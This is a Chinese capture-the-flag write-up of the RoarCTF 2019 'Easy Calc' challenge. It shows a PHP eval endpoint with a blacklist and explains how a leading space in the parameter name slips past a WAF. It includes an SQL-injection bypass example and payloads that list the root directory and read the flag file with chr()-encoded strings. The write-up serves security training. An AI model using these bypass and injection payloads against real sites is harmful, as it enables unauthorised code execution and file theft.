## [RoarCTF 2019]Easy Calc

代码审计

`calc.php`

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>

```

我们知道`PHP`将查询字符串（在`URL`或正文中）转换为内部`$_GET`或的关联数组`$_POST`。例如：`/?foo=bar`变成`Array([foo] => “bar”)`。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，`/?%20news[id%00=42`会转换为`Array([news_id] => 42)`。如果一个`IDS/IPS`或`WAF`中有一条规则是当`news_id`参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：

`/news.php?%20news[id%00=42"+AND+1=0–`

上述`PHP`语句的参数`%20news[id%00`的值将存储到`$_GET["news_id"]`中。

`PHP`需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

> 1.删除空白符
>
> 2.将某些字符转换为下划线（包括空格）

在了解到`PHP`的字符串解析之后，我们思考一个问题，`WAF`它不让`num`参数`传入字母`，所以我们不能让`WAF文件检测到字母`，但是我们又需要传入字母来构成我们的命令，这种情况下我们该怎么对其进行绕过呢？

绕过方法

因为`num`不可以传入字母，但是我们在`num`参数之前添加一个空格，这样在`PHP`的语言特性下会`默认删除这个空格`，但是`WAF`会因为这个空格导致检测不到`num`这个参数，最终导致`WAF`被绕过。

Payload

>
> <http://node4.buuoj.cn:25591/calc.php?num=a> #被拦截
>
>
> <http://node4.buuoj.cn:25591/calc.php>? num=a #绕过WAF

```
/calc.php? num=var_dump(scandir(chr(47)))
calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

[参考文章](https://www.cnblogs.com/sfsec/p/15205011.html)